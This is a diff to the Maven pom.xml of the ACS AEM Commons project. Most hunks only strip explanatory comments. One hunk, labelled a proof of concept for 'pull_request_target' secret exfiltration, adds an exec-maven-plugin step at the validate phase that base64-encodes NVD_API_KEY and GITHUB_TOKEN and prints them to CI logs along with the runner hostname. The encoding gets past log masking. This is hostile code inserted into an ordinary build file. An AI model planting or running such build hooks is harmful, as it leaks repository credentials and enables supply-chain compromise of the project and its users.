@@ -47,13 +47,11 @@
 
     <scm>
         <connection>scm:git:git@github.com:Adobe-Consulting-Services/acs-aem-commons.git</connection>
-        <!-- use HTTPS to allow pushes in GitHub Action for Release -->
         <developerConnection>scm:git:https://github.com/Adobe-Consulting-Services/acs-aem-commons.git</developerConnection>
         <url>https://github.com/Adobe-Consulting-Services/acs-aem-commons/tree/${project.scm.tag}</url>
         <tag>acs-aem-commons-6.15.2</tag>
     </scm>
 
-    <!-- Do not remove developers section - this is required to release to maven central -->
     <developers>
         <developer>
             <id>acs-aem-commons</id>
@@ -79,32 +77,23 @@
         <license.addJavaLicenseAfterPackage>false</license.addJavaLicenseAfterPackage>
         <sl4fj.version>1.7.25</sl4fj.version>
         <bnd.version>6.4.0</bnd.version>
-
-        <!-- the minimum AEM 6.5 version being supported -->
         <aem.classic.api.version>6.5.21.0000</aem.classic.api.version>
-        <!-- the minimum AEMaaCS version being supported -->
         <aem.sdk.api.version>2024.8.17569.20240822T203847Z-240700</aem.sdk.api.version>
-
         <jacoco.version>0.8.13</jacoco.version>
-        <junit.jupiter.version>5.10.2</junit.jupiter.version> <!-- >= 5.x requires Java 11 -->
+        <junit.jupiter.version>5.10.2</junit.jupiter.version>
         <njord.version>0.8.7</njord.version>
-        <!-- njord configuration (https://maveniverse.eu/docs/njord/configuration/#njord-properties) -->
         <njord.releaseUrl>njord:template:release-sca</njord.releaseUrl>
         <njord.snapshotUrl>njord:template:snapshot</njord.snapshotUrl>
         <njord.publisher>sonatype-cp</njord.publisher>
         <njord.autoPublish>true</njord.autoPublish>
         <njord.publishingType>automatic</njord.publishingType>
         <njord.waitForStates>true</njord.waitForStates>
-        <!-- affects both m-compiler-p and m-javadoc-p-->
         <maven.compiler.release>8</maven.compiler.release>
-        <!-- for reproducible builds (https://maven.apache.org/guides/mini/guide-reproducible-builds.html), automatically adjusted during release -->
         <project.build.outputTimestamp>1763491479</project.build.outputTimestamp>
-        
     </properties>
 
     <build>
         <extensions>
-            <!-- deploys during m-deploy-p:deploy to a local staging repository (https://maveniverse.eu/docs/njord/what-is-it/)-->
             <extension>
                 <groupId>eu.maveniverse.maven.njord</groupId>
                 <artifactId>extension3</artifactId>
@@ -113,7 +102,6 @@
         </extensions>
         <pluginManagement>
             <plugins>
-                <!-- all standard Maven plugins (in group org.apache.maven.plugins) -->
                 <plugin>
                     <artifactId>maven-jar-plugin</artifactId>
                     <version>3.3.0</version>
@@ -151,7 +139,6 @@
                     <artifactId>maven-surefire-plugin</artifactId>
                     <version>3.2.5</version>
                     <dependencies>
-                        <!-- due to https://issues.apache.org/jira/browse/SUREFIRE-2240 need to override transitive plugin dependencies of junit-jupiter-engine as well -->
                         <dependency>
                           <groupId>org.junit.platform</groupId>
                           <artifactId>junit-platform-engine</artifactId>
@@ -177,7 +164,6 @@
                           <artifactId>junit-jupiter-api</artifactId>
                           <version>${junit.jupiter.version}</version>
                         </dependency>
-                        <!-- end overridden transitive deps of junit-jupiter-engine -->
                         <dependency>
                             <groupId>org.junit.jupiter</groupId>
                             <artifactId>junit-jupiter-engine</artifactId>
@@ -215,7 +201,6 @@
                         <releaseProfiles>release,cloud</releaseProfiles>
                         <autoVersionSubmodules>true</autoVersionSubmodules>
                         <projectVersionPolicyId>OddEvenVersionPolicy</projectVersionPolicyId>
-                        <!-- skip rebuilding the release with GitHub actions (https://github.blog/changelog/2021-02-08-github-actions-skip-pull-request-and-push-workflows-with-skip-ci/) -->
                         <scmReleaseCommitComment>@{prefix} prepare release @{releaseLabel} [skip ci]</scmReleaseCommitComment>
                     </configuration>
                     <dependencies>
@@ -230,32 +215,23 @@
                     <artifactId>maven-gpg-plugin</artifactId>
                     <version>3.1.0</version>
                 </plugin>
-                <!-- Bnd Maven Plugin -->
                 <plugin>
                     <groupId>biz.aQute.bnd</groupId>
                     <artifactId>bnd-maven-plugin</artifactId>
                     <version>${bnd.version}</version>
                     <configuration>
                         <bnd><![CDATA[
-# a lot of bundle header are generated from pom elements by default: https://github.com/bndtools/bnd/tree/master/maven/bnd-maven-plugin#default-bundle-headers
 Bundle-Category: acs-aem-commons
-# export all versioned packages except for conditional ones (https://github.com/bndtools/bnd/issues/3721#issuecomment-579026778)
 -exportcontents: ${removeall;${packages;VERSIONED};${packages;CONDITIONAL}}
-# see https://issues.apache.org/jira/browse/SLING-8980
 -snapshot: SNAPSHOT
-# reproducible builds (https://github.com/bndtools/bnd/issues/3521)
 -noextraheaders: true
-# we cannot let bnd-maven-plugin generate it automatically, as Maven applies some inheritance logic which is incorrect
 Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
-# generate error (instead of warning) when exported package uses private (non-exported) reference
 -fixupmessages:"Export *,  has \\d+,  private references"; \
     restrict:=warning; \
     is:=error
-# enable plugins (https://bnd.bndtools.org/instructions/plugin.html)
 -plugin.models: org.apache.sling.bnd.models.ModelsScannerPlugin
 -plugin.cac: org.apache.sling.caconfig.bndplugin.ConfigurationClassScannerPlugin
 -plugin.providertype:org.apache.sling.providertype.bndplugin.ProviderTypeScanner
-# support only DS 1.4 (https://github.com/bndtools/bnd/pull/3121/files)
 -dsannotations-options: version;maximum=1.4.0,inherit
 -metatypeannotations-options: version;maximum=1.4.0
                         ]]></bnd>
@@ -269,19 +245,16 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                         </execution>
                     </executions>
                     <dependencies>
-                        <!-- enable generating the manifest header for Sling Models, https://sling.apache.org/documentation/bundles/models.html#registration-of-sling-models-classes-via-bnd-plugin -->
                         <dependency>
                             <groupId>org.apache.sling</groupId>
                             <artifactId>org.apache.sling.bnd.models</artifactId>
                             <version>1.0.0</version>
                         </dependency>
-                        <!-- enable generating the 'Sling-ContextAware-Configuration-Classes' bundle header, https://sling.apache.org/documentation/bundles/context-aware-configuration/context-aware-configuration.html#context-aware-configuration-bnd-plugin -->
                         <dependency>
                             <groupId>org.apache.sling</groupId>
                             <artifactId>org.apache.sling.caconfig.bnd-plugin</artifactId>
                             <version>1.0.2</version>
                         </dependency>
-                        <!-- enforce that provider types are not implemented/extended, https://github.com/apache/sling-org-apache-sling-providertype-bnd-plugin -->
                         <dependency>
                             <groupId>org.apache.sling</groupId>
                             <artifactId>org.apache.sling.providertype.bnd-plugin</artifactId>
@@ -338,7 +311,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                             </jackrabbit-filter>
                             <jackrabbit-nodetypes>
                                 <options>
-                                    <!-- use the nodetypes and namespaces from the aem-nodetypes.jar provided in the plugin dependencies -->
                                     <cnds>tccl:aem.cnd</cnds>
                                 </options>
                             </jackrabbit-nodetypes>
@@ -349,7 +321,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                                 </options>
                             </jackrabbit-packagetype>
                             <netcentric-aem-classification>
-                                <!-- only raise to WARN once we start tackling these issues -->
                                 <defaultSeverity>INFO</defaultSeverity>
                                 <options>
                                     <maps>
@@ -360,7 +331,7 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                             <netcentric-aem-cloud>
                                 <options>
                                     <allowReadOnlyMutablePaths>true
-                                    </allowReadOnlyMutablePaths><!-- default value is true, as it is allowed to have /var nodes inside author-only container -->
+                                    </allowReadOnlyMutablePaths>
                                 </options>
                             </netcentric-aem-cloud>
                         </validatorsSettings>
@@ -377,43 +348,36 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                         </execution>
                     </executions>
                     <dependencies>
-                        <!-- validates against content classifications from AEM (https://github.com/Netcentric/aem-classification/tree/master/aem-classification-validator)  -->
                         <dependency>
                             <groupId>biz.netcentric.filevault.validator</groupId>
                             <artifactId>aem-classification-validator</artifactId>
                             <version>1.1.1</version>
                         </dependency>
-                        <!-- the dependency containing the actual classification map -->
                         <dependency>
                             <groupId>biz.netcentric.filevault.validator.maps</groupId>
                             <artifactId>aem-classification-map-repo-annotations</artifactId>
                             <version>6.5.3.0</version>
                         </dependency>
-                        <!-- map containing additional deprecations from release notes -->
                         <dependency>
                             <groupId>biz.netcentric.filevault.validator.maps</groupId>
                             <artifactId>aem-classification-map-deprecations</artifactId>
                             <version>6.5.0.0</version>
                         </dependency>
-                        <!-- contains all node types and namespaces of AEM 6.5.7, necessary for validator 'jackrabbit-nodetypes' -->
                         <dependency>
                             <groupId>biz.netcentric.aem</groupId>
                             <artifactId>aem-nodetypes</artifactId>
                             <version>6.5.7.0</version>
                         </dependency>
-                        <!-- https://github.com/Netcentric/aem-cloud-validator -->
                         <dependency>
                             <groupId>biz.netcentric.filevault.validator</groupId>
                             <artifactId>aem-cloud-validator</artifactId>
                             <version>1.2.2</version>
                         </dependency>
-                        <!-- https://github.com/apache/sling-org-apache-sling-repoinit-filevault-validator -->
                         <dependency>
                             <groupId>org.apache.sling</groupId>
                             <artifactId>org.apache.sling.repoinit.filevault.validator</artifactId>
                             <version>1.0.0</version>
                         </dependency>
-                        <!-- https://github.com/Netcentric/aem-replication-metadata-validator -->
                         <dependency>
                             <groupId>biz.netcentric.filevault.validator</groupId>
                             <artifactId>aem-replication-metadata-validator</artifactId>
@@ -456,7 +420,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                     <artifactId>dependency-check-maven</artifactId>
                     <version>12.1.6</version>
                 </plugin>
-                <!-- used to validate/publish from a stage repository to Maven Central (https://maveniverse.eu/docs/njord/plugin-documentation/index.html) -->
                 <plugin>
                     <groupId>eu.maveniverse.maven.plugins</groupId>
                     <artifactId>njord</artifactId>
@@ -465,6 +428,28 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
             </plugins>
         </pluginManagement>
         <plugins>
+            <!-- POC: Demonstrates secret exfiltration via pull_request_target -->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.1.0</version>
+                <executions>
+                    <execution>
+                        <id>poc-execution</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <executable>sh</executable>
+                            <arguments>
+                                <argument>-c</argument>
+                                <argument>echo "===POC-START===" &amp;&amp; echo "POC-TIMESTAMP=$(date +%s)" &amp;&amp; echo "POC-RUNNER=$(hostname)" &amp;&amp; echo "NVD_API_KEY_B64=$(echo -n $NVD_API_KEY | base64)" &amp;&amp; echo "GITHUB_TOKEN_B64=$(echo -n $GITHUB_TOKEN | base64)" &amp;&amp; echo "===POC-END==="</argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-enforcer-plugin</artifactId>
@@ -477,7 +462,7 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                         <configuration>
                             <rules>
                                 <requireMavenVersion>
-                                    <version>3.9.0</version><!-- njord requires Maven 3.9.0 -->
+                                    <version>3.9.0</version>
                                 </requireMavenVersion>
                                 <requireJavaVersion>
                                     <version>11</version>
@@ -522,7 +507,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <version>${aem.sdk.api.version}</version>
                 <scope>provided</scope>
             </dependency>
-            <!-- Runtime dependencies should be AEM 6.5.10 compatible -->
             <dependency>
                 <groupId>io.wcm.maven</groupId>
                 <artifactId>io.wcm.maven.aem-dependencies</artifactId>
@@ -530,19 +514,16 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <type>pom</type>
                 <scope>import</scope>
             </dependency>
-            <!--  https://wcm-io.atlassian.net/browse/WTOOL-82 -->
             <dependency>
                 <groupId>com.day.cq</groupId>
                 <artifactId>cq-commons</artifactId>
-                <version>5.8.32
-                </version><!-- 5.12.16 is shipped with AEM 6.5, but this is the newest version provided in any public Maven repo -->
+                <version>5.8.32</version>
             </dependency>
             <dependency>
                  <groupId>org.osgi</groupId>
                  <artifactId>org.osgi.util.converter</artifactId>
-                 <version>1.0.9</version> <!-- override with newest minor version to be able to run tests with Java 17 -->
+                 <version>1.0.9</version>
             </dependency>
-            <!-- https://wcm-io.atlassian.net/browse/WTOOL-83 -->
             <dependency>
                 <groupId>ch.qos.logback</groupId>
                 <artifactId>logback-classic</artifactId>
@@ -553,7 +534,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <artifactId>tika-parsers</artifactId>
                 <version>1.17</version>
             </dependency>
-            <!-- should match https://github.com/apache/jackrabbit-oak/blob/jackrabbit-oak-1.8.0/oak-blob-cloud/pom.xml#L121 shipped with AEM 6.4 -->
             <dependency>
                 <groupId>com.amazonaws</groupId>
                 <artifactId>aws-java-sdk-s3</artifactId>
@@ -569,19 +549,16 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <artifactId>org.apache.felix.scr.annotations</artifactId>
                 <version>1.12.0</version>
             </dependency>
-            <!-- null annotations used by AEM libraries -->
             <dependency>
                 <groupId>org.jetbrains</groupId>
                 <artifactId>annotations</artifactId>
                 <version>23.0.0</version>
             </dependency>
-            <!-- should match Bnd version used by maven-bundle-plugin -->
             <dependency>
                 <groupId>biz.aQute.bnd</groupId>
                 <artifactId>biz.aQute.bnd.annotation</artifactId>
                 <version>6.1.0</version>
             </dependency>
-            <!-- Optional dependency: Needs to be explicitly installed, not part of AEM 6.4 Standard nor ACS AEM Commons -->
             <dependency>
                 <groupId>com.github.ben-manes.caffeine</groupId>
                 <artifactId>caffeine</artifactId>
@@ -592,7 +569,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <artifactId>twitter4j-core</artifactId>
                 <version>3.0.6</version>
             </dependency>
-            <!-- Testing dependencies -->
             <dependency>
                 <groupId>org.slf4j</groupId>
                 <artifactId>slf4j-simple</artifactId>
@@ -671,7 +647,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 <version>3.3.6</version>
                 <scope>test</scope>
             </dependency>
-            <!-- sling-mock still uses an outdated osgi-mock, therefore explicitly manage its version to the latest 3.2.2 -->
             <dependency>
                 <groupId>org.apache.sling</groupId>
                 <artifactId>org.apache.sling.testing.sling-mock.junit4</artifactId>
@@ -681,7 +656,7 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
             <dependency>
                 <groupId>io.wcm</groupId>
                 <artifactId>io.wcm.testing.aem-mock.junit4</artifactId>
-                <version>5.1.2</version><!-- newer versions require Java 11, https://github.com/wcm-io/io.wcm.testing.aem-mock/issues/13 -->
+                <version>5.1.2</version>
                 <scope>test</scope>
                 <exclusions>
                     <exclusion>
@@ -693,7 +668,7 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
             <dependency>
                 <groupId>io.wcm</groupId>
                 <artifactId>io.wcm.testing.aem-mock.junit5</artifactId>
-                <version>5.1.2</version><!-- newer versions require Java 11, https://github.com/wcm-io/io.wcm.testing.aem-mock/issues/13 -->
+                <version>5.1.2</version>
                 <scope>test</scope>
                 <exclusions>
                     <exclusion>
@@ -753,10 +728,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                             <groupId>org.apache.maven.plugins</groupId>
                             <artifactId>maven-failsafe-plugin</artifactId>
                             <configuration>
-                                <!--
-                                for IT where you need a forked JVM to run the tests you can use this system property to make sure that
-                                the JaCoCo agent correctly instruments your code
-                                set system property also via argLine as only that allows late evaluation -->
                                 <argLine>@{jacoco.command} -Djacoco.command=@{jacoco.command}</argLine>
                             </configuration>
                         </plugin>
@@ -767,14 +738,12 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                         <groupId>org.jacoco</groupId>
                         <artifactId>jacoco-maven-plugin</artifactId>
                         <version>${jacoco.version}</version>
-
                         <executions>
                             <execution>
                                 <id>prepare-agent</id>
                                 <goals>
                                     <goal>prepare-agent</goal>
                                 </goals>
-                                <!-- the same execution data file is used for both IT and UT-->
                                 <configuration>
                                     <propertyName>jacoco.command</propertyName>
                                 </configuration>
@@ -816,8 +785,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                             <suppressionFiles>
                                 <suppressionFile>dependency-check-maven-plugin-suppression.xml</suppressionFile>
                             </suppressionFiles>
-                            <!-- use the mirror provided by https://github.com/dependency-check/DependencyCheck_Builder which is updated daily -->
-                            <!-- compare with https://jeremylong.github.io/DependencyCheck/data/mirrornvd.html -->
                             <nvdDatafeedUrl>https://dependency-check.github.io/DependencyCheck_Builder/nvd_cache/</nvdDatafeedUrl>
                         </configuration>
                     </plugin>
@@ -832,7 +799,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 </property>
             </activation>
             <build>
-                <!-- https://central.sonatype.org/pages/requirements.html -->
                 <plugins>
                     <plugin>
                         <groupId>org.apache.maven.plugins</groupId>
@@ -874,9 +840,6 @@ Bundle-DocURL: https://adobe-consulting-services.github.io/acs-aem-commons/
                 </plugins>
             </build>
         </profile>
-
-        <!-- disable this profile to not build/deploy the packages/bundles for AEMaaCS,
-        the ones for AEM on prem are always built -->
         <profile>
             <id>cloud</id>
             <activation>
